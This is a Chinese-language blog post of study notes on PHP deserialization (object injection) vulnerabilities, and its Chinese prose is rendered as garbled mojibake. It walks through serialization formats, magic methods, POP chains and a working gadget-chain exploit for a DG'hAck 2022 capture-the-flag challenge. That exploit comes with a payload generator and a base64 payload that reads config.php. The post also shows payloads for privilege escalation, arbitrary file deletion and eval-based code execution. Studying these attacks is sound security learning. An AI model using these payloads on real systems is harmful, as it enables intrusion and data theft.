
<!DOCTYPE html>
<html>
  <head>
    
<meta charset="utf-8" >

<title>PHPååºåˆ—åŒ–ç¬”è®° | æŒå‰‘</title>
<meta name="description" content="ç¢æœˆæ˜Ÿè¾°æ½æ±Ÿé£ , æˆ‘å¿ƒæœ‰å‰‘é—®å¤©æ¶¯ ">

<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.0/animate.min.css">

<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
<link rel="shortcut icon" href="https://1dayluo.github.io/favicon.ico?v=1711284755357">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
<link rel="stylesheet" href="https://1dayluo.github.io/styles/main.css">



<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
<script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>



  </head>
  <body>
    <div id="app" class="main">
      <div class="site-header-container">
  <div class="site-header">
    <div class="left">
      <a href="https://1dayluo.github.io">
        <img class="avatar" src="https://1dayluo.github.io/images/avatar.png?v=1711284755357" alt="" width="32px" height="32px">
      </a>
      <a href="https://1dayluo.github.io">
        <h1 class="site-title">æŒå‰‘</h1>
      </a>
    </div>
    <div class="right">
      <transition name="fade">
        <i class="icon" :class="{ 'icon-close-outline': menuVisible, 'icon-menu-outline': !menuVisible }" @click="menuVisible = !menuVisible"></i>
      </transition>
    </div>
  </div>
</div>

<transition name="fade">
  <div class="menu-container" style="display: none;" v-show="menuVisible">
    <div class="menu-list">
      
        
          <a href="/" class="menu purple-link">
            é¦–é¡µ
          </a>
        
      
        
          <a href="/archives" class="menu purple-link">
            å½’æ¡£
          </a>
        
      
        
          <a href="/tags" class="menu purple-link">
            æ ‡ç­¾
          </a>
        
      
        
          <a href="/post/about" class="menu purple-link">
            å…³äº
          </a>
        
      
    </div>
  </div>
</transition>


      <div class="content-container">
        <div class="post-detail">
          
          <h2 class="post-title">PHPååºåˆ—åŒ–ç¬”è®°</h2>
          <div class="post-info post-detail-info">
            <span><i class="icon-calendar-outline"></i> 2022-12-21</span>
            
              <span>
                <i class="icon-pricetags-outline"></i>
                
                  <a href="https://1dayluo.github.io/tag/5CW47rOjA1/">
                    å­¦ä¹ ç¬”è®°
                    
                      ï¼Œ
                    
                  </a>
                
                  <a href="https://1dayluo.github.io/tag/xzEJIiyn4G/">
                    PHP
                    
                  </a>
                
              </span>
            
          </div>
          <div class="post-content" v-pre>
            <h1 id="ååºåˆ—åŒ–">ååºåˆ—åŒ–</h1>
<p>æ¦‚å¿µæ•´ç†æ¬è¿å·¥ï¼Œéƒ½æ˜¯çœ‹å„ç±»ç½‘ä¸Šæ–‡ç« æ•´ç†å¥½ä¹…+è‡ªå·±çš„å­¦ä¹ ç†è§£æ‰å‘å¸ƒçš„åšæ–‡ovo å‚è€ƒè§æ–‡æœ«ï¼Œå¦‚æœæœ‰è½ä¸‹æ¬¢è¿æŒ‡æ­£ã€‚æ›´æ–°æœ€æ–°ç‰ˆè§åœ¨ä¸ªäººnotionï¼Œ<s>ä¸æ‡’çš„è¯æœ‰æ›´æ–°ä¼šåŠæ—¶åŒæ­¥åˆ°blogçš„233</s></p>
<h2 id="æ¦‚å¿µ"><strong>æ¦‚å¿µ</strong></h2>
<p><strong>åºåˆ—åŒ–</strong></p>
<p>å°†å„æ•°æ®ç±»å‹,å‹ç¼©ä¸ºå›ºå®šæ ¼å¼è¿›è¡Œå­˜å‚¨,ä½¿ç”¨çš„å‡½æ•°æ˜¯<code>serialize()</code></p>
<p>ä¹‹æ‰€ä»¥éœ€è¦åºåˆ—åŒ–æ˜¯å› ä¸ºPHP æ–‡ä»¶åœ¨æ‰§è¡Œç»“æŸä»¥åå°±ä¼šå°†å¯¹è±¡é”€æ¯ï¼Œ ä½†å¦‚æœé”€æ¯å¯¹è±¡è¦éšåä½¿ç”¨åˆ™éœ€è¦ä¸€ç§æ–¹å¼æ¥é•¿ä¹…ä¿å­˜.</p>
<p>åºåˆ—åŒ–å¯ä»¥å°†å¯¹è±¡è½¬æ¢æˆå­—ç¬¦ä¸²ï¼Œä½†ä»…ä¿ç•™å¯¹è±¡é‡Œçš„æˆå‘˜å˜é‡ï¼Œä¸ä¿ç•™å‡½æ•°æ–¹æ³•ã€‚</p>
<blockquote>
<p>å®˜æ–¹è§£é‡Šï¼š</p>
<ol>
<li><a href="https://www.php.net/manual/en/function.serialize.php">serialize</a>Â - Generates a storable representation of a value.</li>
<li><a href="https://www.php.net/manual/en/function.unserialize.php">unserialize</a>Â - Creates a PHP value from a stored representation.</li>
</ol>
</blockquote>
<p><strong>ååºåˆ—åŒ–</strong></p>
<p><strong>å°†ç”¨æˆ·å¯æ§çš„æ•°æ®è¿›è¡Œäº†ååºåˆ—åŒ–</strong>ï¼Œå°±æ˜¯PHPååºåˆ—åŒ–æ¼æ´ã€‚</p>
<p>PHP ååºåˆ—åŒ–æ¼æ´åˆå«åš PHP å¯¹è±¡æ³¨å…¥æ¼æ´,</p>
<p>å®ç°ååºåˆ—åŒ–æ³¨å…¥</p>
<ul>
<li><code>unserialize()</code></li>
<li>ä½¿ç”¨åè®® <code>phar://</code></li>
</ul>
<h2 id="åºåˆ—åŒ–åçš„æ ¼å¼"><strong>åºåˆ—åŒ–åçš„æ ¼å¼</strong></h2>
<figure data-type="image" tabindex="1"><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%93%E6%9E%9C1.png" alt="https//picture1253331270cosapbeijingmyqcloudcom/%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%93%E6%9E%9C1png" loading="lazy"></figure>
<ul>
<li>public:
<ul>
<li>é•¿åº¦ = å˜é‡åçš„å­—ç¬¦æ•°é‡å¦‚å®</li>
</ul>
</li>
<li>private:
<ul>
<li>``%00ç±»å%00å±æ€§å`</li>
<li>é•¿åº¦ = å˜é‡åçš„é•¿åº¦+ç±»åçš„é•¿åº¦+2(ä¸¤ä¸ªé•¿åº¦çš„%00)</li>
</ul>
</li>
<li>protected:
<ul>
<li><code>%00*%00å±æ€§å</code></li>
<li>é•¿åº¦ = å˜é‡å + 3</li>
</ul>
</li>
</ul>
<h2 id="äº§ç”Ÿçš„åŸå› "><strong>äº§ç”Ÿçš„åŸå› </strong></h2>
<p>å‚æ•°å¯æ§</p>
<h2 id="injection-types">Injection Types</h2>
<p>æ¥æºï¼š<a href="https://www.xanhacks.xyz/p/php-gadget-chain/">https://www.xanhacks.xyz/p/php-gadget-chain/</a> æ˜¯å¾·å›½çš„å¤§ä½¬ovo ï¼ˆæƒ³çœ‹æ–‡ç« æ‰€æŒ‡çš„<a href="https://www.dghack.fr/">DGâ€™hAck</a> Â 2022 edition.ï¼Œç»“æœéƒ½æ˜¯å¾·æ–‡å‘œå‘œã€‚</p>
<h3 id="attribute-injection">Attribute injection</h3>
<p><strong>ä»€ä¹ˆæ˜¯å±æ€§æ³¨å…¥ï¼Ÿ</strong></p>
<p>å±æ€§æ³¨å…¥æ˜¯æŒ‡çš„æ˜¯ï¼Œæ”»å‡»è€…æœ‰å¯èƒ½ä¿®æ”¹ä¸€ä¸ªinstanceçš„å±æ€§ï¼ˆattributeï¼‰çš„å€¼ã€‚</p>
<p><strong>å¦‚ä½•å®ç°å±æ€§æ³¨å…¥ï¼Ÿ</strong></p>
<pre><code class="language-python">&lt;?php

class User {

    public string $username;
    public bool $isAdmin;

    public function __construct(string $username)
    {
        $this-&gt;username = $username;
        $this-&gt;isAdmin = false;
    }

}

$user = new User(&quot;toto&quot;);
$data = serialize($user);

echo $data;
</code></pre>
<p>è¿™é‡Œå®ä¾‹instanceæ˜¯ <code>$user</code> ï¼ˆæ˜¯class Userçš„instanceï¼‰ã€‚</p>
<p>å±æ€§æœ‰</p>
<ul>
<li>username</li>
<li>isAdmin</li>
</ul>
<p>å¦‚æœè¿™é‡Œæ”»å‡»è€…èƒ½å¤Ÿæ“ä½œisAdminä¸ºtrueçš„è¯ï¼Œä¾¿å¯ä»¥å¯¼è‡´access controlé—®é¢˜</p>
<p>åºåˆ—åŒ–åä¸º</p>
<pre><code class="language-python">O:4:&quot;User&quot;:2:{s:8:&quot;username&quot;;s:4:&quot;toto&quot;;s:7:&quot;isAdmin&quot;;b:0;}
</code></pre>
<p>æ”»å‡»è€…å¯ä»¥ä¿®æ”¹ isAdminä¸º1</p>
<pre><code class="language-python">O:4:&quot;User&quot;:2:{s:8:&quot;username&quot;;s:4:&quot;toto&quot;;s:7:&quot;isAdmin&quot;;b:1;}
</code></pre>
<h3 id="object-injection">Object injection</h3>
<p><strong>å±æ€§æ³¨å…¥æ˜¯ä»€ä¹ˆï¼Ÿæœ‰ä»€ä¹ˆå±å®³</strong></p>
<p>ä¸åŒäºç›´æ¥ä¿®æ”¹objectä¸‹çš„å±æ€§ï¼Œè¿˜æœ‰ä¸€ç§å¯èƒ½æ˜¯ååºåˆ—åŒ–å…¶ä»–objectçš„instanceã€‚è¿™å¯èƒ½ä¼šå¯¼è‡´code execution,file writing or reading,calling a protected functionâ€¦..</p>
<p><strong>å¦‚ä½•å®ç°å±æ€§æ³¨å…¥</strong></p>
<p>ä¸ºäº†å®ç°è¿™ä¸€ç‚¹ï¼Œæˆ‘ä»¬è¦ç”¨åˆ°gadgetsï¼ˆå¸®åŠ©æ”»å‡»è€…å®ç°ç‰¹å®šç›®çš„ï¼‰ï¼š applicationä»£ç é‡Œå·²æœ‰çš„PHP gadgets ï¼Œ æˆ–è€…ï¼Œå­˜åœ¨äºPHP librariesçš„PHP gadgetsã€‚</p>
<p>æ€»ä¹‹ï¼Œå®ç°object injectionéœ€è¦ï¼š</p>
<ul>
<li>ä¸€ä¸ªPHP gadgets</li>
<li>å¯èƒ½ä¼šç”¨åˆ°é­”æœ¯æ–¹æ³•ï¼ˆMagic methodsï¼‰ï¼šå‚è€ƒç¬”è®°åé¢æ ‡é¢˜</li>
</ul>
<p>ä¸¾ä¾‹å­çš„è¯ï¼Œæ¯”å¦‚æœ‰ä»¥ä¸‹phpä»£ç ä½äºapplicationä¸­</p>
<pre><code class="language-python">class FileManager {

  public string $filePath;

  public function __construct(string $filePath)
  {
    $this-&gt;filePath = $filePath;
  }

  // ...

  public function __destruct()
  {
    echo &quot;The file &quot; . $this-&gt;filePath . &quot; will be deleted.&quot; . PHP_EOL;
    unlink($this-&gt;filePath);
  }

}
</code></pre>
<p>è¿™é‡Œ <code>_desturct</code> åœ¨instanceè¢«æ¶ˆé™¤æ—¶è‡ªåŠ¨è°ƒç”¨ï¼ˆè¢«garbage collectorè°ƒç”¨ï¼‰ï¼šè‡ªåŠ¨è°ƒç”¨æ—¶ä¼šè°ƒç”¨å‡½æ•°ä¸‹çš„ <code>unlink</code> åˆ é™¤æŒ‡å®šçš„filePathï¼Œæ‰€ä»¥æ”»å‡»è€…å¯ä»¥æ„é€ å¦‚ä¸‹payloadï¼Œå®ç°åˆ é™¤ä»»æ„æ–‡ä»¶</p>
<pre><code class="language-python">unserialize('O:11:&quot;FileManager&quot;:1:{s:8:&quot;filePath&quot;;s:9:&quot;/tmp/toto&quot;;}');
</code></pre>
<p><strong>å®‰å…¨ç ”ç©¶æ–¹å‘ï¼Ÿ</strong></p>
<p>å®‰å…¨ç ”ç©¶è€…ä¼šç ”ç©¶Symfony, Laravel, ZendFramework, â€¦ è¿™ç±»çš„PHP librariesï¼Œå»å¯»æ‰¾gadgets</p>
<h3 id="æ›´å¤šçš„object-injectionæ¡ˆä¾‹dghack2022-edition">æ›´å¤šçš„Object injectionæ¡ˆä¾‹ï¼š<a href="https://www.dghack.fr/">DGâ€™hAck</a>2022 edition</h3>
<p>èƒŒæ™¯æè¦ï¼šæ”»å‡»è€…è¦å®¡è®¡è¯¥webæœåŠ¡å™¨ä¸Šçš„æºä»£ç ï¼Œä»è€Œè·å–è®¿é—®æƒé™çš„æ–¹æ³•â€¦â€¦ç›®æ ‡æ˜¯config.phpæ–‡ä»¶ã€‚</p>
<p>ç½‘ç«™åœ°å€ï¼š<a href="http://unserialkiller2.chall.malicecyber.com/">http://unserialkiller2.chall.malicecyber.com/</a></p>
<p>config.phpæ–‡ä»¶å†…å®¹</p>
<pre><code class="language-python">if (isset($_REQUEST[&quot;data&quot;])) {
  try {
    $decoded = base64_decode($_REQUEST[&quot;data&quot;]);
    $data = unserialize($decoded);
  } catch (\Throwable $t) {
    var_dump($t);
  }
}
</code></pre>
<p>ç¬¬ä¸€æ¡gadgetsä½äºï¼š ./app/vendor/guzzlehttp/psr7/src/Stream.phpä¸‹åä¸ºStreamçš„ classä¸­</p>
<pre><code class="language-php">public function __destruct()
{
    $this-&gt;customMetadata-&gt;closeContent($this-&gt;size);
}
</code></pre>
<p>è¿™é‡ŒcloseContentæ²¡æœ‰è¢«å®šä¹‰ã€‚å¯ä»¥è°ƒç”¨é­”æœ¯æ–¹æ³• <code>__call</code></p>
<p>ç¬¬äºŒæ¡gadgetä½äºï¼š./app/vendor/guzzlehttp/psr7/src/StreamDecoratorTrait.php ä¸‹çš„åä¸º<code>StreamDecoratorTrait</code> çš„ Traitä¸­ â†’ è¢«CachingStreamè¿™ä¸ªç±»ç»§æ‰¿</p>
<pre><code class="language-php">public function __call($method, array $args)
{
    $result = null;
    if (is_object($this-&gt;stream) &amp;&amp; method_exists($this-&gt;stream, &quot;decorate&quot;)) { //must be true class FnStream
        if (in_array($method, $this-&gt;getAllowedMethods()) !== true) {
            $method = $this-&gt;custom_method;
        }
        if (is_array($method) !== true) {
            $method = [$method];
        }

        $args = $args[0];

        foreach ($method as $_method) {
            if (is_callable([$this-&gt;stream, $_method])) {
                $arguments = array_shift($args);
                $result = $this-&gt;stream-&gt;$_method(...$arguments);
            }
        }
    }
    // Always return the wrapped object if the result is a return $this
    return $result === $this-&gt;stream ? $this : $result;
}
</code></pre>
<p>è¿™é‡Œ <code>$method</code> å¸¦å…¥ä¸º <code>closeContent</code><br>
å› ä¸ºcloseContentä¸ä½äºgetAllowedMethods(),æ‰€ä»¥æœ€å <code>$method</code> å°†ç­‰äº <code>$this-&gt;custom_method</code></p>
<p>ç¬¬ä¸‰æ¡gadget ä½äº./app/vendor/guzzlehttp/psr7/src/FnStream.php çš„FnStreamï¼ˆåŒ…å«åä¸ºdecorateçš„æ–¹æ³•ï¼‰</p>
<p>è¯¥ç±»æœ‰</p>
<ul>
<li>decorate æ–¹æ³•</li>
<li>getContents æ–¹æ³• ï¼š è¯»å–phpæ–‡ä»¶</li>
</ul>
<pre><code class="language-php">public function getContents()
{
  $content = &quot;&quot;;
  if (isset($this-&gt;_fn_getContents) &amp;&amp; is_string($this-&gt;_fn_getContents)) {
    $file = __DIR__ . $this-&gt;_fn_getContents . &quot;.php&quot;;
    if ($this-&gt;display_content === true) {
      readfile($file);
      echo &quot;Printing interesting file...&quot; . PHP_EOL;
    }
  }
  retur
</code></pre>
<blockquote>
<p><code>display_content</code>Â must be set toÂ <code>true</code>.</p>
<p><code>_fn_getContents</code>Â must be set toÂ <code>/../../../../config</code>Â (relative path from theÂ <code>FnStream.php</code>Â file path).</p>
<p>æ‰€ä»¥æœ€åï¼š</p>
<p>$file = &quot;./app/vendor/guzzlehttp/psr7/src&quot; . &quot;/../../../../config&quot; . &quot;.php&quot;;</p>
<p>$file = &quot;./app/config.php&quot;;</p>
</blockquote>
<p>è¿™é‡Œï¼Œæˆ‘ä»¬æœ¬å¯ä»¥è®¾ç½® <code>display_content</code> ä¸ºtrueï¼Œä¸”æ„é€ ç‰¹å®šçš„ <code>_fn_getContents</code> ã€‚ä½†æ˜¯ä¸å¹¸çš„æ˜¯FnStreamæœ‰ä¸€ä¸ªé­”æœ¯æ–¹æ³• <code>__wakeup</code> ï¼Œç”¨æ¥unsetå®ƒçš„ç±»ä¸‹çš„å…¨éƒ¨attributeã€‚è¿™é‡Œä¸èƒ½ç›´æ¥è®¾ç½®attributeçš„å€¼ï¼Œè€Œåˆšå¥½ï¼ŒFnStreamç±»ä¸‹æœ‰ä¸€ä¸ªå«åš <code>register</code> çš„æ–¹æ³•å…è®¸æˆ‘ä»¬å»è®¾ç½®attributeã€‚</p>
<pre><code class="language-php">public function register(string $name, $callback)
{
  if (in_array($name, self::$forbidden_attributes) === true) {
    throw new \LogicException('FnStream should never register this attribute: ' . $name);
  }
  $this-&gt;{$name} = $callback;
  $this-&gt;methods[] = [$name, $callback];
}
</code></pre>
<p>åŒæ—¶ï¼Œ <code>_fn_getContents</code> åœ¨ <code>forbidden_attributes</code> å†…ï¼Œè¿™é‡Œæˆ‘ä»¬è°ƒç”¨ <code>allow_attribute</code> çš„æ–¹æ³•å»ç§»é™¤é™åˆ¶</p>
<pre><code class="language-php">public function allow_attribute(string $name)
{
  if (in_array($name, self::$forbidden_attributes, true) === true) {
    $offset = array_search($name, self::$forbidden_attributes, true);
    unset(self::$forbidden_attributes[$offset]);
  }
}
</code></pre>
<p>ä¹Ÿå°±æ˜¯è¯´gadgetç¬¬3æ¡éœ€è¦è°ƒç”¨è¿™ä¸¤ä¸ªæ–¹æ³•æ¥ç§»é™¤é™åˆ¶ã€‚</p>
<p>æ‰€æœ‰çš„åˆ©ç”¨é“¾ä¸²åœ¨ä¸€èµ·ï¼Œç›®æ ‡æ˜¯è¯»å–configæ–‡ä»¶ï¼Œå³ç¬¬ä¸‰æ¡gadgetä¸‹æˆ‘ä»¬è®¾æƒ³çš„ <code>$file</code> åº”è¯¥çš„å€¼ã€‚</p>
<p>é¦–å…ˆå‡½æ•°è°ƒå…¥ç‚¹ï¼ˆå…¥å£åœ¨è¿™é‡Œï¼‰æ˜¯ç¬¬ä¸€æ¡gadgetï¼š <code>__desstruct() </code>å‘ç°æ²¡æœ‰å®šä¹‰<code>$this-&gt;customMetadata</code> ä¸‹çš„<code>closeContent</code>ï¼Œåˆ™è¿›è¡Œè°ƒç”¨  <code>$thisâ†’customMetadata</code> çš„ <code> _call</code>å‡½æ•° ï¼ˆåœ¨è°ƒç”¨ <code>_call</code>å‡½æ•°å‰ï¼Œæ³¨æ„ä¼šå…ˆè°ƒç”¨ <code>__construct</code> æ–¹æ³•. è¿™é‡ŒæŠŠ<code>$thisâ†’customMetadata</code>è®¾ç½®ä¸ºCachingStreamï¼Œå¹¶ä¸”å®ç°trait <code>StreamDecoratorTrait</code> ã€‚</p>
<p>åœ¨è°ƒç”¨ <code>__call</code> å‡½æ•°å‰ï¼Œå…ˆåœ¨ <code>__construct</code> ä¸‹è®¾ç½®ï¼š</p>
<ul>
<li><code>$this-&gt;stream</code></li>
<li><code>$this-&gt;custom_method</code></li>
</ul>
<p>ä»è€Œæ»¡è¶³ç¬¬äºŒæ¡gadgetä¸‹çš„æ¡ä»¶ã€‚æœ€åç¬¬äºŒæ¡gadgetè§¦å‘ï¼Œè°ƒç”¨ <code>$this-&gt;custom_method</code> æ•°ç»„å†…çš„function ï¼ˆå®šä¹‰åœ¨å®ç°è¯¥traitçš„<code>Fnstream</code> classå†…ã€‚å³ç¬¬ä¸‰æ¡gadgetä¸‹çš„registerï¼Œallow_attributeç­‰æ–¹æ³•ï¼‰ã€‚</p>
<p>æœ€åçš„ä»£ç æ˜¯</p>
<pre><code class="language-php">&lt;?php

namespace GuzzleHttp\Psr7;

class FnStream {

    private static $forbidden_attributes = [
        &quot;_fn___toString&quot;,
        &quot;_fn_close&quot;,
        &quot;_fn_detach&quot;,
        &quot;_fn_getSize&quot;,
        &quot;_fn_tell&quot;,
        &quot;_fn_eof&quot;,
        &quot;_fn_isSeekable&quot;,
        &quot;_fn_rewind&quot;,
        &quot;_fn_seek&quot;,
        &quot;_fn_getContents&quot;,
        &quot;_fn_isWritable&quot;,
        &quot;_fn_write&quot;,
        &quot;_fn_isReadable&quot;,
        &quot;_fn_read&quot;,
        &quot;_fn_getMetadata&quot;
    ];

    public function register(string $name, $callback)
    {
        if (in_array($name, self::$forbidden_attributes) === true) {
            throw new \LogicException('FnStream should never register this attribute: ' . $name);
        }
        $this-&gt;{$name} = $callback;
        $this-&gt;methods[] = [$name, $callback];
    }

    public function allow_attribute(string $name)
    {
        if (in_array($name, self::$forbidden_attributes, true) === true) {
            $offset = array_search($name, self::$forbidden_attributes, true);
            unset(self::$forbidden_attributes[$offset]);
        }
    }

    public function __wakeup()
    {
        unset($this-&gt;_fn_getMetadata);
        unset($this-&gt;_fn_close);
        unset($this-&gt;_fn_detach);
        unset($this-&gt;_fn_eof);
        unset($this-&gt;_fn_isSeekable);
        unset($this-&gt;_fn_rewind);
        unset($this-&gt;_fn___toString);
        unset($this-&gt;_fn_seek);
        unset($this-&gt;_fn_isWritable);
        unset($this-&gt;_fn_write);
        unset($this-&gt;_fn_getContents);
        unset($this-&gt;_fn_getSize);
        unset($this-&gt;_fn_tell);
        unset($this-&gt;_fn_isReadable);
        unset($this-&gt;_fn_read);
        echo &quot;Disabling easy peasy attributes&quot; . PHP_EOL;
    }

    public function getContents()
    {
        $content = &quot;&quot;;
        if (isset($this-&gt;_fn_getContents) &amp;&amp; is_string($this-&gt;_fn_getContents)) {
            $file = __DIR__ . $this-&gt;_fn_getContents . &quot;.php&quot;;
            if ($this-&gt;display_content === true) {
                readfile($file);
                echo &quot;Printing interesting file...&quot; . PHP_EOL;
            }
        }
        return $content;
    }

    public static function decorate() {}
}

use ReflectionMethod;

trait StreamDecoratorTrait {
    public function __call($method, array $args)
    {
        $result = null;
        if (is_object($this-&gt;stream) &amp;&amp; method_exists($this-&gt;stream, &quot;decorate&quot;)) {
            if (in_array($method, $this-&gt;getAllowedMethods()) !== true) {
                $method = $this-&gt;custom_method;
            }
            if (is_array($method) !== true) {
                $method = [$method];
            }

            $args = $args[0];

            foreach ($method as $_method) {
                if (is_callable([$this-&gt;stream, $_method])) {
                    $arguments = array_shift($args);
                    $result = $this-&gt;stream-&gt;$_method(...$arguments);
                }
            }
        }
        // Always return the wrapped object if the result is a return $this
        return $result === $this-&gt;stream ? $this : $result;
    }

    public function getAllowedMethods($filter = array('close'))
    {
        $classReflection = new \ReflectionClass(&quot;GuzzleHttp\Psr7\FnStream&quot;);
        $methodsReflections = $classReflection-&gt;getMethods();
        $methodNames = array_map(function (ReflectionMethod $methodReflection) {
            return $methodReflection-&gt;getName();
        }, array_values($methodsReflections));
        $methodNames = array_diff($methodNames, $filter);
        return $methodNames;
    }
}

class CachingStream
{
    use StreamDecoratorTrait;

    public function __construct()
    {
        $this-&gt;stream = new FnStream();
        $this-&gt;custom_method = array(&quot;register&quot;, &quot;allow_attribute&quot;, &quot;register&quot;, &quot;getContents&quot;);
    }
}

class Stream {
    public $size;
    public $customMetadata;

    public function __construct()
    {
        $this-&gt;size = array(
            array(&quot;display_content&quot;, true),
            array(&quot;_fn_getContents&quot;),
            array(&quot;_fn_getContents&quot;, &quot;/../../../../config&quot;),
            array()
        );
        $this-&gt;customMetadata = new CachingStream();
    }

    public function __destruct()
    {
        $this-&gt;customMetadata-&gt;closeContent($this-&gt;size);
    }
}

$GENERATE = true;

if ($GENERATE) {
    $stream = new Stream();
    $data = serialize($stream);

    echo $data . PHP_EOL;
    echo base64_encode($data) . PHP_EOL;
} else {
    $data = base64_decode(&quot;Tzo2OiJTdHJlYW0iOjI6e3M6NDoic2l6ZSI7YTo0OntpOjA7YToyOntpOjA7czoxNToiZGlzcGxheV9jb250ZW50IjtpOjE7YjoxO31pOjE7YToxOntpOjA7czoxNToiX2ZuX2dldENvbnRlbnRzIjt9aToyO2E6Mjp7aTowO3M6MTU6Il9mbl9nZXRDb250ZW50cyI7aToxO3M6MTk6Ii8uLi8uLi8uLi8uLi9jb25maWciO31pOjM7YTowOnt9fXM6MTQ6ImN1c3RvbU1ldGFkYXRhIjtPOjEzOiJDYWNoaW5nU3RyZWFtIjoyOntzOjY6InN0cmVhbSI7Tzo4OiJGblN0cmVhbSI6Mjp7czoxNToiX2ZuX2dldENvbnRlbnRzIjtzOjE5OiIvLi4vLi4vLi4vLi4vY29uZmlnIjtzOjE1OiJkaXNwbGF5X2NvbnRlbnQiO2I6MTt9czoxMzoiY3VzdG9tX21ldGhvZCI7YTo0OntpOjA7czo4OiJyZWdpc3RlciI7aToxO3M6MTU6ImFsbG93X2F0dHJpYnV0ZSI7aToyO3M6ODoicmVnaXN0ZXIiO2k6MztzOjExOiJnZXRDb250ZW50cyI7fX19&quot;);
    unserialize($data);
}
</code></pre>
<h2 id="é­”æœ¯æ–¹æ³•"><strong>é­”æœ¯æ–¹æ³•</strong></h2>
<blockquote>
<p><a href="https://www.php.net/manual/en/language.oop5.magic.php">Magic methods</a> are special methods which override PHPâ€™s defaultâ€™s action when certain actions are performed on an object.</p>
</blockquote>
<h3 id="ä¸€è§ˆ">ä¸€è§ˆ:</h3>
<p>æ˜¯ä¸€ç§åœ¨ç±»åºåˆ—åŒ–æˆ–ååºåˆ—åŒ–ä¸­è‡ªåŠ¨å®Œæˆçš„ä¸€äº›æ“ä½œ.</p>
<p>(1**)<strong>construct()</strong>ï¼š**å½“å¯¹è±¡åˆ›å»ºæ—¶ä¼šè‡ªåŠ¨è°ƒç”¨(ä½†åœ¨unserialize()æ—¶æ˜¯ä¸ä¼šè‡ªåŠ¨è°ƒç”¨çš„)ã€‚<br>
(2)wakeup() ï¼šunserialize()æ—¶ä¼šè‡ªåŠ¨è°ƒç”¨<br>
(3)destruct()ï¼šå½“å¯¹è±¡è¢«é”€æ¯æ—¶ä¼šè‡ªåŠ¨è°ƒç”¨ã€‚<br>
(4)toString():å½“ååºåˆ—åŒ–åçš„å¯¹è±¡è¢«è¾“å‡ºåœ¨æ¨¡æ¿ä¸­çš„æ—¶å€™ï¼ˆè½¬æ¢æˆå­—ç¬¦ä¸²çš„æ—¶å€™ï¼‰è‡ªåŠ¨è°ƒç”¨<br>
(5)get() **ğŸ˜—*å½“ä»ä¸å¯è®¿é—®çš„å±æ€§è¯»å–æ•°æ®<br>
(6)call(): åœ¨å¯¹è±¡ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘</p>
<p>(7)sleep():åœ¨ä¸€ä¸ªå¯¹è±¡è¢«åºåˆ—åŒ–ä¹‹å‰è°ƒç”¨ï¼›</p>
<h3 id="destructä¸¾ä¾‹">destructä¸¾ä¾‹</h3>
<p>æ¡ˆä¾‹1: ä¿®æ”¹destructä¸‹çš„å˜é‡ä¸ºå¦ä¸€ç±»</p>
<p>åŸå§‹ä»£ç å¦‚ä¸‹:</p>
<pre><code class="language-php">&lt;?php
class K0rz3n {
    private $test;
    public $K0rz3n = &quot;i am K0rz3n&quot;;
    function __construct() {
        $this-&gt;test = new L();
    }

    function __destruct() {
        $this-&gt;test-&gt;action();
    }
}

class L {
    function action() {
        echo &quot;Welcome to XDSEC&quot;;
    }
}

class Evil {

    var $test2;
    function action() {
        eval($this-&gt;test2);
    }
}

unserialize($_GET['test']);
</code></pre>
<p>æŸ¥æ‰¾åçš„å…±åŒç‚¹å¦‚ä¸‹:</p>
<ul>
<li>å‘ç°<code>Evil</code>ç±»è°ƒç”¨äº†actionæ–¹æ³•(ä½¿ç”¨äº†eval)</li>
<li><code>K0rz3n</code> ç±»åœ¨<code>destruct</code> ä¸‹è‡ªåŠ¨è°ƒç”¨äº†testä¸‹çš„actionæ–¹æ³•</li>
</ul>
<p>å…¥æ‰‹ç‚¹:</p>
<ul>
<li>ä¿®æ”¹constructä¸‹çš„test</li>
</ul>
<p>ä¿®æ”¹åçš„<code>K0rz3n</code> ç±»å¦‚ä¸‹:</p>
<pre><code class="language-php">&lt;?php
class K0rz3n {
    private $test;
    function __construct() {
        $this-&gt;test = new Evil;
    }
}

class Evil {

    var $test2 = &quot;phpinfo();&quot;;

}
</code></pre>
<figure data-type="image" tabindex="2"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2022_12/Untitleda_0.png" alt="Untitled" loading="lazy"></figure>
<h2 id="popé“¾">POPé“¾</h2>
<p>POP é¢å‘å±æ€§ç¼–ç¨‹(Property-Oriented Programing)</p>
<p><strong>æ¦‚å¿µ</strong></p>
<p><strong>ä»ç°æœ‰è¿è¡Œç¯å¢ƒ</strong>ä¸­å¯»æ‰¾ä¸€ç³»åˆ—çš„ä»£ç æˆ–è€…æŒ‡ä»¤è°ƒç”¨ï¼Œç„¶åæ ¹æ®éœ€æ±‚æ„æˆä¸€ç»„è¿ç»­çš„è°ƒç”¨é“¾,æœ€ç»ˆè¾¾åˆ°æ”»å‡»è€…é‚ªæ¶çš„ç›®çš„</p>
<h3 id="æ¡ˆä¾‹">æ¡ˆä¾‹</h3>
<p>å¦‚ä¸‹æ–‡ç« </p>
<ul>
<li><a href="https://www.k0rz3n.com/2018/11/19/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">https://www.k0rz3n.com/2018/11/19/ä¸€ç¯‡æ–‡ç« å¸¦ä½ æ·±å…¥ç†è§£PHPååºåˆ—åŒ–æ¼æ´/</a></li>
</ul>
<h2 id="phar">phar://</h2>
<p><a href="https://paper.seebug.org/680/">https://paper.seebug.org/680/</a></p>
